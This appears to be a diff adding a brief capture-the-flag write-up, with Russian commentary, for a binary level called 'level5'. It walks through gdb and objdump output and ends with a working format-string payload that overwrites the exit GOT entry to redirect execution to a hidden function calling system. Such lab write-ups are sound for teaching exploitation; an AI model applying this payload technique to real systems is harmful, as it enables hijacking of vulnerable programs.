@@ -1,1 +1,46 @@
-w
+gdb 
+info functions 
+
+....
+0x08048420  __do_global_dtors_aux
+0x08048480  frame_dummy
+0x080484a4  o
+0x080484c2  n
+0x08048504  main
+0x08048520  __libc_csu_init
+....
+
+disas main 
+...
+0x0804850a <+6>:	call   0x80484c2 <n>
+...
+
+disas n
+...
+ 0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
+ 0x080484ea <+40>:	lea    -0x208(%ebp),%eax
+ 0x080484f0 <+46>:	mov    %eax,(%esp)
+ 0x080484f3 <+49>:	call   0x8048380 <printf@plt>
+ 0x080484f8 <+54>:	movl   $0x1,(%esp)
+ 0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+ 
+Нет функции o! Необходимо найти способ ее вызвать, чтобы вызвать system. Замечаем  <exit@plt> в n и <_exit@plt> в o. Попробуем перезаписать адрес, на который указывает exit функции n, адресом функции o.
+
+x o
+...
+0x80484a4 <o>:	0x83e58955
+...
+
+objdump -TR level5
+...
+08049838 R_386_JUMP_SLOT   exit
+...
+
+0x080484a4 => 134 513 828 в десятичной системе 
+________________________________________________________________________
+python -c "print '\x38\x98\x04\x08' + '%134513824x%4\$n'" > /tmp/test5
+cat /tmp/test5 - | ./level5
+
+
+
+
